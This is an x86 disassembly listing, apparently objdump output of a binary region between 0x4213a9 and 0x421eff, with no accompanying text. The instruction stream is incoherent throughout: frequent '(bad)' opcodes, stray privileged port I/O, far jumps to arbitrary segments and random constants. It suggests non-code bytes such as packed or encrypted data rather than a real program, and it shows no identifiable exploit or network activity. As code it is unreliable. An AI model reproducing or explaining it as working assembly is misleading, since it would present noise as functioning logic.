  4213a9:	retf   
  4213aa:	or     eax,0x5a5d9d99
  4213af:	dec    esi
  4213b0:	pop    esi
  4213b1:	pushf  
  4213b2:	(bad)  
  4213b3:	stos   DWORD PTR es:[edi],eax
  4213b4:	daa    
  4213b5:	lods   eax,DWORD PTR ds:[esi]
  4213b6:	fwait
  4213b7:	mov    ds:0xa7278b2f,eax
  4213bc:	sbb    ecx,DWORD PTR [ebx+ebp*1]
  4213bf:	cdq    
  4213c0:	dec    eax
  4213c1:	xor    eax,0x0
	...
  421432:	add    BYTE PTR [eax],al
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	xchg   esp,eax
  421436:	push   edi
  421437:	adc    bh,BYTE PTR [edi-0x2d]
  42143a:	out    dx,eax
  42143b:	mov    esp,0x960320e2
  421440:	mov    edx,0x64563ecb
  421445:	add    DWORD PTR fs:[eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    BYTE PTR [esi+0x5f],dl
  42144e:	mov    bl,0x1c
  421450:	(bad)  
  421451:	sub    BYTE PTR [ebx+esi*4],al
  421454:	xchg   DWORD PTR [ecx],eax
  421456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421457:	dec    esi
  421458:	mov    ch,0x94
  42145a:	fs popa 
  42145c:	ja     0x421498
  42145e:	jne    0x4214c3
  421460:	lea    esp,[esi]
  421462:	jmp    0xd4564c5a
  421467:	ja     0x4214cc
  421469:	mov    al,ds:0x80dcf8ca
  42146e:	push   cs
  42146f:	mov    ebp,0x8cd209bc
  421474:	fild   WORD PTR [ebx]
  421476:	scas   al,BYTE PTR es:[edi]
  421477:	loop   0x421426
  421479:	out    dx,eax
  42147a:	jp     0x421404
  42147c:	cmc    
  42147d:	push   0x2a
  42147f:	sbb    eax,0x4bffd9c6
  421484:	jnp    0x4214e6
  421486:	jae    0x42149b
  421488:	je     0x4214fe
  42148a:	in     al,0x92
  42148c:	add    edx,DWORD PTR [ebx+0x46491cd3]
  421492:	push   0x3d1e18fd
  421497:	xlat   BYTE PTR ds:[ebx]
  421498:	test   al,0x65
  42149a:	sbb    edi,DWORD PTR [esi+0x26ad64e8]
  4214a0:	hlt    
  4214a1:	mov    dl,0x30
  4214a3:	xor    ebx,DWORD PTR [edi-0x12111004]
  4214a9:	sub    DWORD PTR [edx],esi
  4214ab:	mov    eax,DWORD PTR [ecx]
  4214ad:	int    0x17
  4214af:	lea    eax,[eax]
  4214b1:	inc    ebx
  4214b2:	clc    
  4214b3:	jmp    0x8f64:0xeb3f6b40
  4214ba:	cmp    eax,0xa737700a
  4214bf:	adc    ebp,DWORD PTR [esi+0x11ba05c9]
  4214c5:	out    dx,eax
  4214c6:	inc    ebx
  4214c7:	test   DWORD PTR [ebx],ecx
  4214c9:	rcl    bl,0xc1
  4214cc:	in     eax,0x77
  4214ce:	int    0xb1
  4214d0:	fist   WORD PTR ds:[eax+0xe799c61]
  4214d7:	pop    ds
  4214d8:	(bad)  
  4214d9:	lock in eax,0x5a
  4214dc:	xlat   BYTE PTR ds:[ebx]
  4214dd:	push   ebp
  4214de:	pop    edi
  4214df:	cmp    ebx,DWORD PTR [ebx]
  4214e1:	xor    DWORD PTR [ebp+ebp*8+0x9],eax
  4214e5:	daa    
  4214e6:	cmp    al,0x3
  4214e8:	push   0x66f79da5
  4214ed:	inc    edx
  4214ee:	inc    esi
  4214ef:	fild   DWORD PTR [eax]
  4214f1:	arpl   WORD PTR ds:[ebx-0x24],bp
  4214f5:	or     eax,0xb5359f99
  4214fa:	sub    bh,BYTE PTR [edx]
  4214fc:	int    0x66
  4214fe:	inc    ebx
  4214ff:	pop    eax
  421500:	fdivr  QWORD PTR [edx-0x2]
  421503:	(bad)  
  421504:	and    esp,DWORD PTR [ebp-0x5d0535ff]
  42150a:	jg     0x42156f
  42150c:	push   ss
  42150d:	dec    edi
  42150e:	mov    esp,0xdac8be52
  421513:	sahf   
  421514:	(bad)  
  421515:	in     al,dx
  421516:	mul    esp
  421518:	ret    
  421519:	rcr    DWORD PTR [ebx-0x6bea5914],cl
  42151f:	sub    dh,BYTE PTR [eax]
  421521:	pop    edx
  421522:	mov    eax,ds:0x9fcc4a41
  421527:	enter  0x7fc0,0xe5
  42152b:	xchg   edx,eax
  42152c:	adc    BYTE PTR [ebx+0x52],cl
  42152f:	fs out dx,al
  421531:	cmp    al,0xe5
  421533:	(bad)  
  421534:	jns    0x4215b1
  421536:	jmp    0x8667:0xecb5f7f8
  42153d:	pushf  
  42153e:	iret   
  42153f:	mov    es,ecx
  421541:	fiadd  DWORD PTR [eax]
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	pop    ss
  4215c1:	popf   
  4215c2:	add    esp,DWORD PTR [eax+0x1655a]
  4215c8:	test   BYTE PTR [eax],0x0
  4215cb:	add    BYTE PTR [eax],bh
  4215cd:	push   esi
  4215ce:	retf   0xf883
  4215d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215d2:	int3   
  4215d3:	push   esi
  4215d4:	pop    esi
  4215d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215d6:	or     esi,ebp
  4215d8:	lock (bad) 
  4215da:	push   ebx
  4215db:	fistp  QWORD PTR [ebp+0x22]
  4215de:	jns    0x42158d
  4215e0:	jle    0x421607
  4215e2:	pop    eax
  4215e3:	call   0xb126:0x4c7119a
  4215ea:	lods   al,BYTE PTR ds:[esi]
  4215eb:	outs   dx,DWORD PTR ds:[esi]
  4215ec:	sbb    cl,BYTE PTR [esi+0x6d]
  4215ef:	mov    esp,0x21c974
  4215f4:	leave  
  4215f5:	rol    DWORD PTR [edi+0x6],cl
  4215f8:	fdiv   st(4),st
  4215fa:	pop    edx
  4215fb:	mov    cl,0x6a
  4215fd:	sbb    BYTE PTR [ebx-0x6],0x40
  421601:	pop    ss
  421602:	sahf   
  421603:	cmp    bl,BYTE PTR cs:[ebx-0x78]
  421607:	jecxz  0x4215fb
  421609:	into   
  42160a:	(bad)  
  42160c:	cmp    dl,BYTE PTR [ebx+eax*4]
  42160f:	xchg   ebx,eax
  421610:	cdq    
  421611:	sub    eax,0x845f73ef
  421616:	and    ah,BYTE PTR [edi+0x2f]
  421619:	out    0x8b,eax
  42161b:	pusha  
  42161c:	adc    ebx,DWORD PTR [esi-0x68]
  42161f:	dec    edi
  421620:	(bad)  
  421621:	dec    esp
  421622:	mov    edx,DWORD PTR [esi+eiz*4-0x13c3aaaa]
  421629:	std    
  42162a:	sub    ebx,esi
  42162c:	xchg   ebp,eax
  42162d:	out    0xdb,eax
  42162f:	mov    esi,0xade95570
  421634:	cmp    DWORD PTR ds:0x3c029d4e,esi
  42163a:	pop    es
  42163b:	rcl    BYTE PTR ds:0x50c2a5fd,1
  421641:	adc    eax,0x479d5f31
  421646:	test   eax,0xa61e4e7
  42164b:	xor    BYTE PTR [eax+eax*1-0x22],bh
  42164f:	addr16 push esp
  421651:	cmp    eax,0x2e109a5e
  421656:	imul   edi,DWORD PTR [ebp+edx*4+0x20],0xe6cf967d
  42165e:	ja     0x421694
  421660:	pop    esi
  421661:	or     BYTE PTR ds:0x752e0de4,bh
  421667:	or     DWORD PTR [ebx-0x8],esp
  42166a:	pop    es
  42166b:	jno    0x4216cc
  42166d:	xchg   edx,eax
  42166e:	lock enter 0x658,0xc0
  421673:	adc    DWORD PTR [ecx+0x6529190],0x2d
  42167a:	add    dh,bl
  42167c:	sahf   
  42167d:	pop    eax
  42167f:	clc    
  421680:	popf   
  421681:	inc    BYTE PTR [ebx]
  421683:	and    eax,0xc970f64b
  421688:	ins    DWORD PTR es:[edi],dx
  421689:	xchg   DWORD PTR [ebp-0x6],ebx
  42168c:	test   al,0x43
  42168e:	pop    edx
  42168f:	jg     0x42165b
  421691:	sub    BYTE PTR [ecx-0x1ef13ef8],0x0
  421698:	stos   BYTE PTR es:[edi],al
  421699:	cmp    cl,BYTE PTR [ebp-0x5e]
  42169c:	jge    0x246ae7c4
  4216a2:	mov    ebx,0xa202ad82
  4216a7:	and    eax,DWORD PTR [ebx]
  4216a9:	mov    eax,ds:0x3d209bbe
  4216ae:	jo     0x42167c
  4216b0:	adc    eax,0x4a63dbb9
  4216b5:	enter  0x84f5,0xc2
  4216b9:	push   eax
  4216ba:	aas    
  4216bb:	xor    edi,DWORD PTR [edi]
  4216bd:	aas    
  4216be:	inc    esi
  4216bf:	jmp    esi
  4216c1:	xor    eax,DWORD PTR [eax]
	...
  421733:	add    BYTE PTR [ecx-0x587fdad1],cl
  421739:	mov    ch,BYTE PTR [ebp-0x7e7b35d1]
  42173f:	cmp    ebx,DWORD PTR [ecx+0x50a19b3c]
  421745:	add    WORD PTR [eax],ax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [eax-0x37],ch
  42174e:	je     0x42173b
  421750:	inc    ebx
  421752:	cmp    DWORD PTR [eax+0x10],edx
  421755:	mov    edx,0xd888fca5
  42175a:	jecxz  0x4217c2
  42175c:	or     eax,0x670920be
  421761:	mov    BYTE PTR [edx+0x2d7bb753],ah
  421767:	test   ah,dh
  421769:	call   0xf80d1dc1
  42176e:	mov    ebx,0x4a760f3c
  421773:	jmp    0x4217ba
  421775:	mov    cl,0xb
  421777:	sbb    bh,BYTE PTR [edi-0xd1ddbb8]
  42177d:	test   DWORD PTR [edi+ebp*1+0x453b6ec4],edx
  421784:	and    cl,BYTE PTR [edi]
  421786:	fs and bh,dl
  421789:	sahf   
  42178a:	or     bl,cl
  42178c:	push   0xffffff91
  42178e:	sbb    BYTE PTR [ecx+ecx*1],dl
  421791:	and    BYTE PTR [ebx+esi*2-0x46],al
  421795:	pop    ebx
  421796:	into   
  421797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421798:	sbb    BYTE PTR [edi+ebp*8+0x9134958],cl
  42179f:	xchg   ecx,eax
  4217a0:	outs   dx,BYTE PTR gs:[esi]
  4217a2:	dec    esp
  4217a3:	ins    BYTE PTR es:[edi],dx
  4217a4:	inc    edx
  4217a5:	xor    eax,0x7d975025
  4217aa:	data16 cmc 
  4217ac:	in     eax,dx
  4217ad:	(bad)  
  4217ae:	xchg   ebx,eax
  4217af:	add    eax,0x4b2135eb
  4217b4:	(bad)  
  4217b5:	cmp    al,0x8b
  4217b7:	sub    dl,BYTE PTR [ebp+0x743702d7]
  4217bd:	pushf  
  4217be:	ror    DWORD PTR [ecx+ebx*8-0x67],cl
  4217c2:	clc    
  4217c3:	nop
  4217c4:	(bad)  
  4217c5:	sbb    BYTE PTR ds:0x1945335,bl
  4217cb:	iret   
  4217cc:	xchg   DWORD PTR [ebp-0x11],edx
  4217cf:	(bad)  
  4217d0:	imul   DWORD PTR [ebp-0x3a]
  4217d3:	call   0xc67c:0x3f89c34d
  4217da:	inc    ebp
  4217db:	lds    eax,FWORD PTR [ecx-0x6]
  4217de:	jg     0x421794
  4217e0:	mov    esi,0x5b4832bd
  4217e5:	jge    0x421789
  4217e7:	aaa    
  4217e8:	mov    ebx,0x680f5503
  4217ed:	cs push edi
  4217ef:	aad    0xd
  4217f1:	or     eax,DWORD PTR [ecx+0x15]
  4217f4:	xchg   ebx,eax
  4217f5:	int    0x78
  4217f7:	or     DWORD PTR [esi-0x64],edx
  4217fa:	sbb    al,0x8b
  4217fc:	cdq    
  4217fd:	sahf   
  4217fe:	sbb    esi,DWORD PTR [eax-0x49]
  421801:	ds popf 
  421803:	loope  0x421849
  421805:	add    BYTE PTR [ebx-0x5f],bh
  421808:	xor    DWORD PTR [ecx+0x3c],ecx
  42180b:	(bad)  
  42180c:	push   ebx
  42180d:	call   0xa0b0e12f
  421812:	jmp    0x4217f5
  421814:	sbb    DWORD PTR [ecx],0xfffffff1
  421817:	sub    edx,DWORD PTR [ecx+0x5b4900e8]
  42181d:	xchg   edi,eax
  42181e:	adc    DWORD PTR [edi-0x72],ecx
  421821:	inc    edx
  421822:	mov    BYTE PTR [eax+0x3f6d4d3b],bl
  421828:	push   ebx
  421829:	xchg   edi,eax
  42182a:	shl    ch,0x31
  42182d:	inc    ecx
  42182e:	retf   0xdf74
  421831:	repz mov ?,eax
  421834:	ss stc 
  421836:	icebp  
  421837:	shl    BYTE PTR [edx-0x2850f6ce],1
  42183d:	mov    bl,0xf1
  42183f:	or     bl,0x59
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ebx,esi
  4218c1:	data16 aas 
  4218c3:	test   BYTE PTR [esi+0x67],0x1
  4218c7:	add    dh,dh
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [esi+0x7b],bh
  4218ce:	pop    ss
  4218cf:	loopne 0x4218fb
  4218d1:	es cs jo 0x421896
  4218d5:	xor    DWORD PTR [eax-0x1fc9f3f9],esp
  4218db:	push   eax
  4218dc:	cmp    bh,ch
  4218de:	rol    DWORD PTR [eax-0x23998bf5],1
  4218e4:	sub    DWORD PTR [esp+edx*8+0x4c],0x68
  4218e9:	cs xchg edi,eax
  4218eb:	cwde   
  4218ec:	pop    ds
  4218ed:	pusha  
  4218ee:	inc    esp
  4218ef:	inc    edx
  4218f0:	hlt    
  4218f1:	dec    edx
  4218f2:	es lahf 
  4218f4:	dec    ebx
  4218f5:	aad    0xdb
  4218f7:	xchg   DWORD PTR [eax+0x62],esp
  4218fa:	and    esi,DWORD PTR [edi+0x3]
  4218fd:	fimul  WORD PTR [edi]
  4218ff:	test   DWORD PTR [esi+ebp*2-0x434da30f],ebp
  421906:	mov    edx,0xc1a0352d
  42190b:	popa   
  42190c:	daa    
  42190d:	mov    ?,WORD PTR [edx]
  42190f:	cmp    esi,DWORD PTR [edi-0x29]
  421912:	pop    ecx
  421913:	mov    ecx,0xaa4231e9
  421918:	scas   al,BYTE PTR es:[edi]
  421919:	fisub  DWORD PTR [edi]
  42191b:	sub    al,0x7e
  42191d:	es pop ebx
  42191f:	add    DWORD PTR [esi-0x24],0xe493f581
  421926:	loope  0x42198b
  421928:	mov    ah,0x17
  42192a:	xchg   BYTE PTR [edi-0x7084cf6e],ch
  421930:	sub    eax,0x776feae2
  421935:	or     BYTE PTR [edx-0x55],al
  421938:	cmp    bh,BYTE PTR [ecx+ebx*1]
  42193b:	mov    edi,0xca8dbaf
  421940:	gs push ecx
  421942:	xor    eax,DWORD PTR [ecx+0x3963d99e]
  421948:	mov    bh,0x70
  42194a:	ds das 
  42194c:	mov    al,ds:0xfc6e56f8
  421951:	push   esi
  421952:	imul   edx,DWORD PTR [esi+eax*1],0x30624a1a
  421959:	es scas eax,DWORD PTR es:[edi]
  42195b:	adc    eax,0xb83fae2b
  421960:	(bad)  
  421961:	icebp  
  421962:	dec    esp
  421963:	sbb    esp,edi
  421965:	std    
  421966:	loop   0x421951
  421968:	repz fldenv [eax+0xe]
  42196c:	shl    BYTE PTR [ebp+0x3e488b92],0x1f
  421973:	in     al,dx
  421974:	enter  0x38f5,0x81
  421978:	push   esp
  421979:	test   DWORD PTR [ebp-0x565b0e3e],ebx
  42197f:	mov    al,ds:0x6c0669a5
  421984:	jne    0x43f5a263
  42198a:	lods   eax,DWORD PTR ds:[esi]
  42198b:	ins    DWORD PTR es:[edi],dx
  42198c:	mov    al,ds:0x443783b1
  421991:	popf   
  421992:	add    esi,ebx
  421994:	pop    ss
  421995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421996:	fucomi st,st(7)
  421998:	fwait
  421999:	(bad)  
  42199a:	fistp  DWORD PTR [eax+edi*8+0x2f62d539]
  4219a1:	mov    eax,?
  4219a3:	inc    esp
  4219a4:	mov    bh,BYTE PTR [edx-0x37936e23]
  4219aa:	test   DWORD PTR ds:0xb242dc65,0xff6cd5d8
  4219b4:	mov    edi,0x1cabdba3
  4219b9:	pop    edx
  4219ba:	imul   DWORD PTR [edi]
  4219bc:	push   esp
  4219bd:	cmp    BYTE PTR [ecx+esi*4],dl
  4219c0:	mov    DWORD PTR [esi+0x0],ecx
	...
  421a33:	add    bh,bl
  421a35:	xor    ch,BYTE PTR [edi-0x6010ed]
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x1f88053]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    BYTE PTR [ebx+0x4445b33b],ch
  421a51:	test   eax,0xcb8be4e1
  421a56:	adc    DWORD PTR [ebx-0x33b8bfea],eax
  421a5c:	sub    eax,0xdb094218
  421a61:	out    dx,eax
  421a62:	sub    eax,0xaa29482e
  421a67:	mov    WORD PTR [esi+esi*4-0x5051567],?
  421a6e:	push   0x37dc3d25
  421a73:	cmp    edi,esi
  421a75:	pop    esp
  421a76:	rol    dl,0x84
  421a79:	pop    es
  421a7a:	imul   ebx,edi,0x67ff2325
  421a80:	add    DWORD PTR [edi-0x2965e3ce],ecx
  421a86:	jae    0x421af3
  421a88:	aaa    
  421a89:	mov    ah,0xc9
  421a8b:	dec    edx
  421a8c:	loope  0x421aa8
  421a8e:	sbb    BYTE PTR [edx+0x6e9a65f6],dh
  421a94:	mov    ch,dl
  421a96:	je     0x421a5f
  421a98:	dec    esi
  421a99:	ds xchg edi,eax
  421a9b:	push   cs
  421a9c:	out    dx,eax
  421a9d:	dec    eax
  421a9e:	data16 mov ss,WORD PTR [ecx+0x616f60eb]
  421aa5:	(bad)  
  421aa6:	popf   
  421aa7:	rol    BYTE PTR [edi+eiz*2],0x2e
  421aab:	jae    0x421a4d
  421aad:	mov    bl,0xfe
  421aaf:	jnp    0x421a4f
  421ab1:	aaa    
  421ab2:	push   ecx
  421ab3:	cld    
  421ab4:	ud1    esi,DWORD PTR [ecx]
  421ab7:	xor    ebx,DWORD PTR gs:[ecx-0x9a2da67]
  421abe:	sub    eax,0x7098c7e2
  421ac3:	push   esi
  421ac4:	pop    ss
  421ac5:	adc    al,0x63
  421ac7:	push   edi
  421ac8:	(bad)  
  421ac9:	cmp    bh,al
  421acb:	sbb    ah,cl
  421acd:	test   DWORD PTR [edi+0x6edf763a],eax
  421ad3:	inc    ecx
  421ad4:	mov    al,ds:0xd3c34cbd
  421ad9:	mov    eax,0x5e196da2
  421ade:	and    eax,0xd57b623a
  421ae3:	lods   al,BYTE PTR ds:[esi]
  421ae4:	loop   0x421ab9
  421ae6:	sub    dh,ah
  421ae8:	sub    DWORD PTR [ebp+0x75],edx
  421aeb:	ja     0x421afc
  421aed:	push   esp
  421aee:	inc    ecx
  421aef:	shl    DWORD PTR [edi+ecx*8],1
  421af2:	imul   esi,DWORD PTR [esp+edi*2],0x28
  421af6:	stc    
  421af7:	mov    esi,0xd9e5bf51
  421afc:	mov    esp,0xcafacd6
  421b01:	fistp  QWORD PTR ds:0xe11e56ca
  421b07:	push   ecx
  421b08:	and    bh,al
  421b0a:	jno    0x421aa1
  421b0c:	into   
  421b0d:	dec    esi
  421b0e:	popf   
  421b0f:	imul   ecx,DWORD PTR [bp+di-0x33],0xfffffffe
  421b14:	ja     0x421aa7
  421b16:	stos   DWORD PTR es:[edi],eax
  421b17:	sbb    al,0xd8
  421b19:	out    dx,al
  421b1a:	pop    ds
  421b1b:	sbb    bl,bh
  421b1d:	cmp    eax,0x38ffd816
  421b22:	jbe    0x421ad9
  421b24:	scas   al,BYTE PTR es:[edi]
  421b25:	xor    DWORD PTR [eax-0x43],0x3e
  421b29:	repnz cmp BYTE PTR [edx+0x62b0aaf0],0x79
  421b31:	pop    edi
  421b32:	add    al,0x2
  421b34:	bound  eax,QWORD PTR cs:[ebx]
  421b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b38:	outs   dx,BYTE PTR ds:[esi]
  421b39:	xchg   ebx,eax
  421b3a:	inc    ebx
  421b3b:	pop    ds
  421b3c:	dec    ebx
  421b3d:	jns    0x421b91
  421b3f:	aas    
  421b40:	pushf  
  421b41:	icebp  
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    esi,DWORD PTR [esi-0x50]
  421bc2:	xchg   edi,eax
  421bc3:	adc    esi,DWORD PTR [edx]
  421bc5:	imul   eax,DWORD PTR [ecx],0xf600
  421bcb:	add    BYTE PTR ds:0x88702660,dh
  421bd1:	clc    
  421bd2:	enter  0x23c6,0x4b
  421bd6:	sbb    BYTE PTR [ecx],dl
  421bd8:	or     eax,0xb9d5ba42
  421bdd:	into   
  421bde:	clc    
  421bdf:	int3   
  421be0:	jmp    0xc8e7b2c2
  421be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421be6:	fsub   DWORD PTR [edx]
  421be8:	xor    BYTE PTR [eax-0x79ba90d4],ch
  421bee:	pop    es
  421bef:	cdq    
  421bf0:	outs   dx,BYTE PTR ds:[esi]
  421bf1:	(bad)  
  421bf3:	ret    0xaabb
  421bf6:	inc    edi
  421bf7:	mov    ah,BYTE PTR [ecx]
  421bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bfa:	bound  edi,QWORD PTR [edx+0xe]
  421bfd:	jg     0x421c3e
  421bff:	adc    edi,DWORD PTR [ebx+0x3ca6bf42]
  421c05:	ins    DWORD PTR es:[edi],dx
  421c06:	repz aam 0xe8
  421c09:	addr16 inc eax
  421c0b:	jno    0x421ba2
  421c0d:	icebp  
  421c0e:	(bad)
  421c11:	xchg   edx,eax
  421c12:	mov    edx,DWORD PTR [eax-0xc7d0c9c]
  421c18:	je     0x421c2b
  421c1a:	pop    ds
  421c1b:	or     al,0xa9
  421c1d:	mov    DWORD PTR ds:0x1530493a,edi
  421c23:	mov    dl,BYTE PTR [edi+0x0]
  421c26:	lock or DWORD PTR [eax+0x3fc87d5c],0x11cd45d1
  421c31:	adc    eax,0x7053bac1
  421c36:	dec    ecx
  421c37:	sbb    esp,DWORD PTR [ecx]
  421c39:	push   ss
  421c3a:	cmp    DWORD PTR [eax+0x4a45372d],edi
  421c40:	pop    ss
  421c41:	dec    ebp
  421c42:	enter  0x4394,0xd4
  421c46:	jmp    0x8d48446e
  421c4b:	mov    dl,0x43
  421c4d:	push   0xab1fadcb
  421c52:	leave  
  421c53:	mov    eax,ds:0xda60dea
  421c58:	loope  0x421cb6
  421c5a:	(bad)  
  421c5b:	aaa    
  421c5c:	cli    
  421c5d:	addr16 fmul st,st(0)
  421c60:	and    ecx,DWORD PTR [ebx+0x4f480730]
  421c66:	mov    ch,0x58
  421c68:	mov    ds:0x4ff679b7,al
  421c6d:	push   ss
  421c6e:	enter  0x4903,0x4b
  421c72:	jno    0x421cb4
  421c74:	div    BYTE PTR [eax+0x7f]
  421c77:	xchg   BYTE PTR [eax],ah
  421c79:	xor    DWORD PTR [eax-0x2ff1d377],eax
  421c7f:	mov    es,WORD PTR [eax+0x784c314f]
  421c85:	addr16 push ds
  421c87:	xor    DWORD PTR [edx+0x18],ebp
  421c8a:	js     0x421cd9
  421c8c:	shl    BYTE PTR [ebx+0x50],1
  421c8f:	push   esp
  421c90:	repnz dec ebp
  421c92:	rcr    BYTE PTR [ebx-0x50],1
  421c95:	push   ecx
  421c96:	add    al,0x2b
  421c98:	jns    0x421cc3
  421c9a:	lods   eax,DWORD PTR ds:[esi]
  421c9b:	xchg   BYTE PTR [edx-0x35],dh
  421c9e:	fs out dx,al
  421ca0:	adc    esp,ecx
  421ca2:	adc    bl,BYTE PTR [esi+0xa1f7fe1]
  421ca8:	popf   
  421ca9:	addr16 mov edx,0xd34e98e3
  421caf:	std    
  421cb0:	pushf  
  421cb1:	cdq    
  421cb2:	or     DWORD PTR [edi+0x21],ebx
  421cb5:	pop    ss
  421cb6:	in     al,dx
  421cb7:	xchg   esi,eax
  421cb8:	pop    ecx
  421cb9:	lds    esp,FWORD PTR [ecx+0x34bab46c]
  421cbf:	ret    
  421cc0:	cmp    BYTE PTR [ecx],bl
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	out    dx,al
  421d41:	fcmovnu st,st(4)
  421d43:	add    BYTE PTR [eax],ch
  421d45:	push   0x1
  421d47:	add    dh,dh
  421d49:	add    BYTE PTR [eax],al
  421d4b:	add    BYTE PTR ds:0x700aab4c,dl
  421d51:	dec    edi
  421d52:	push   edi
  421d53:	push   0xffffffb0
  421d55:	sbb    edx,ecx
  421d57:	aaa    
  421d58:	out    dx,al
  421d59:	dec    esi
  421d5a:	test   al,0x74
  421d5c:	ins    BYTE PTR es:[edi],dx
  421d5d:	sub    DWORD PTR [ebx-0x35e95167],ecx
  421d63:	je     0x421cf6
  421d65:	aad    0xf9
  421d67:	inc    esi
  421d68:	or     ebp,esp
  421d6a:	sar    dh,0x96
  421d6d:	push   eax
  421d6e:	xchg   ecx,eax
  421d6f:	push   ds
  421d70:	daa    
  421d71:	inc    edi
  421d72:	xchg   edi,eax
  421d73:	sti    
  421d74:	pop    ebp
  421d75:	mov    dh,0x64
  421d77:	push   esi
  421d78:	xchg   DWORD PTR [ebx+0x44121656],ecx
  421d7e:	retf   
  421d7f:	fs leave 
  421d81:	jbe    0x421dd8
  421d83:	sbb    eax,0xb67f30a1
  421d88:	dec    edi
  421d89:	sbb    ebp,0xb05dbc85
  421d8f:	mov    fs,WORD PTR [edx+0x75]
  421d92:	dec    edi
  421d93:	adc    eax,0x6b02dc99
  421d98:	les    edi,FWORD PTR [esi-0x35]
  421d9b:	mov    BYTE PTR [esi-0x3fc189be],0xdd
  421da2:	out    0xb4,eax
  421da4:	je     0x421d3d
  421da6:	fdivr  QWORD PTR [ecx]
  421da8:	popf   
  421da9:	repnz out 0xc7,al
  421dac:	fs pop ds
  421dae:	and    edi,DWORD PTR [eax+0x772138d8]
  421db4:	loop   0x421d55
  421db6:	in     al,dx
  421db7:	mov    esi,0x67a62cee
  421dbc:	ret    
  421dbd:	mov    ecx,0xb0f1e6a3
  421dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dc3:	mov    esi,0xe1f200c1
  421dc8:	loope  0x421e01
  421dca:	leave  
  421dcb:	mov    esi,0xcd293214
  421dd0:	pop    ss
  421dd1:	mov    bl,0x50
  421dd3:	outs   dx,BYTE PTR ds:[esi]
  421dd4:	xchg   ebp,eax
  421dd5:	dec    ebx
  421dd6:	cwde   
  421dd7:	out    0xa,al
  421dd9:	neg    BYTE PTR [edi]
  421ddb:	mov    ebx,0xb250fdad
  421de0:	push   esp
  421de1:	push   ecx
  421de2:	push   ss
  421de3:	cdq    
  421de4:	ror    DWORD PTR [esi+0x1e],cl
  421de7:	xor    eax,0x1ba6b899
  421dec:	ret    0xa3cb
  421def:	test   BYTE PTR [ecx+0x74],dl
  421df2:	arpl   dx,si
  421df4:	mov    bl,al
  421df6:	mov    eax,ds:0xef5ad74e
  421dfb:	cmp    al,0x3d
  421dfd:	jne    0x421e69
  421dff:	push   ebx
  421e00:	test   DWORD PTR [eax+edi*2-0x259c993],ebx
  421e07:	inc    esp
  421e08:	jecxz  0x421e73
  421e0a:	jne    0x421dfc
  421e0c:	xchg   esp,eax
  421e0d:	add    al,0x60
  421e0f:	inc    ah
  421e11:	ffreep st(1)
  421e13:	add    BYTE PTR [ecx-0x6593af40],cl
  421e19:	mov    ebx,0x6f212c94
  421e1e:	inc    esp
  421e1f:	ror    BYTE PTR [esp+edx*8],0x3a
  421e23:	sub    dh,cl
  421e25:	push   edi
  421e26:	push   eax
  421e27:	mov    ebx,0x8a264830
  421e2c:	dec    eax
  421e2d:	aas    
  421e2e:	loop   0x421e58
  421e30:	ins    DWORD PTR es:[edi],dx
  421e31:	mov    ecx,0xf3ab3935
  421e36:	enter  0x798,0xa6
  421e3a:	dec    esi
  421e3b:	popf   
  421e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e3d:	out    dx,eax
  421e3e:	in     eax,0xd9
  421e40:	add    BYTE PTR [ebp+0x0],0x0
	...
  421eb3:	add    BYTE PTR [eax],ah
  421eb5:	xchg   edi,eax
  421eb6:	inc    edx
  421eb7:	shl    edi,cl
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421ec6
  421ec1:	out    0xf7,al
  421ec3:	adc    ebx,DWORD PTR [esi]
  421ec5:	imul   eax,DWORD PTR [ecx],0x0
  421ec8:	test   BYTE PTR [eax],0x0
  421ecb:	add    BYTE PTR [eax],al
  421ecd:	ins    BYTE PTR es:[edi],dx
  421ece:	pop    edi
  421ecf:	and    al,0x6f
  421ed1:	aad    0x70
  421ed3:	add    ah,BYTE PTR [edx+0x31bfa56]
  421ed9:	retf   
  421eda:	pop    ebx
  421edb:	loope  0x421e88
  421edd:	cli    
  421ede:	xchg   ebp,eax
  421edf:	mov    dh,0x69
  421ee1:	repnz cwde 
  421ee3:	in     eax,0xaa
  421ee5:	mov    dl,0xf7
  421ee7:	ins    DWORD PTR es:[edi],dx
  421ee8:	jns    0x421e87
  421eea:	aaa    
  421eeb:	mov    eax,0x4d755e08
  421ef0:	add    esi,DWORD PTR [esi+edi*8+0x3abb6170]
  421ef7:	mov    ah,0x9b
  421ef9:	pop    esi
  421efa:	call   0x4723a3c2
  421eff:	dec    edx
